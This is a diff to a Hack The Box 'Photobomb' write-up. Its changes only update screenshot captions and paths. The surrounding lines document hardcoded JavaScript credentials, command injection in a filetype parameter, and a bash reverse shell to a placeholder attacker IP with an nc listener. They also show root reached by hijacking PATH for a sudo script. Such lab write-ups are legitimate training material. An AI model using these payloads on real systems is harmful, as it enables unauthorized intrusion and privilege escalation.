@@ -44,10 +44,10 @@ Added entry in /etc/hosts:
 <target_IP>    photobomb.htb  
 
 *Figure 1 – Nmap scan results*  
-![Nmap scan](01_nmap.png)
+![Figure 01 — Nmap scan](assets/screenshots/01_nmap.png)
 
 *Figure 2 – /etc/hosts modification*
-![Hosts file](02_hosts.png)
+![Figure 02 — Hosts / gobuster hint](assets/screenshots/02_hosts.png)
 
 ---
 
@@ -61,7 +61,7 @@ Inside the code, static credentials were present:
 Login URL: http://photobomb.htb/printer  
 
 *Figure 3 – Credentials exposed in photobomb.js*
-![JS credentials](04_js_creds.png)
+![Figure 03 — JS credentials (photobomb.js)](assets/screenshots/04_js_creds.png)
 
 ### Command Injection
 POST request to /printer is vulnerable to command injection in parameter `filetype`.
@@ -70,7 +70,7 @@ Example payload: `filetype=png;sleep 5;`
 Response time increased by ~5 seconds, confirming execution of system command. 
 
 *Figure 4 – Burp Suite request showing command injection*
-![Command injection in Burp](05_command_injection.png)
+![Figure 04 — Command injection in Burp](assets/screenshots/05_command_injection.png)
 
 ### Reverse Shell
 Payload: filetype=jpg;bash -i >& /dev/tcp/<attacker_IP>/<attacker_port> 0>&1  
@@ -78,7 +78,7 @@ Listener: nc -lvnp 9001
 Result: reverse shell as user wizard.  
 
 *Figure 5 – Reverse shell established as wizard*
-![Reverse shell](05b_reverse_shell.png)
+![Figure 05 — Reverse shell](assets/screenshots/05b_reverse_shell.png)
 
 ---
 
@@ -88,7 +88,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm  
 
 *Figure 6 – Stabilized wizard shell*
-![Stabilized shell](06_stabilized_shell.png)
+![Figure 06 — Stabilized shell](assets/screenshots/06_stabilized_shell.png)
 
 ---
 
@@ -99,7 +99,7 @@ Checked with: sudo -l
 Output: (root) SETENV: NOPASSWD: /opt/cleanup.sh  
 
 *Figure 7 – Sudo permissions for cleanup.sh*
-![Sudo permissions](07_sudo_permissions.png)
+![Figure 07 — Sudo permissions](assets/screenshots/07_sudo_permissions.png)
 
 ### Script Analysis
 Content of /opt/cleanup.sh:  
@@ -123,7 +123,7 @@ sudo PATH=/dev/shm:$PATH /opt/cleanup.sh
 Result: root shell obtained.  
 
 *Figure 8 – Root shell obtained via PATH hijack*
-![Root shell via PATH hijack](08_root_shell.png)
+![Figure 08 — Root shell via PATH hijack](assets/screenshots/08_root_shell.png)
 
 ---
 
@@ -132,11 +132,11 @@ User flag: cat /home/wizard/user.txt
 Root flag: cat /root/root.txt  
 
 *Figure 9 – User flag*  
-![User flag](09_user_flag.png)  
+![Figure 09 — User flag (masked)](assets/screenshots/09_user_flag.png)
 Output: `HTB{redacted}`  
 
 *Figure 10 – Root flag*  
-![Root flag](10_root_flag.png)  
+![Figure 10 — Root flag (masked)](assets/screenshots/10_root_flag.png)
 Output: `HTB{redacted}`
 
 ---
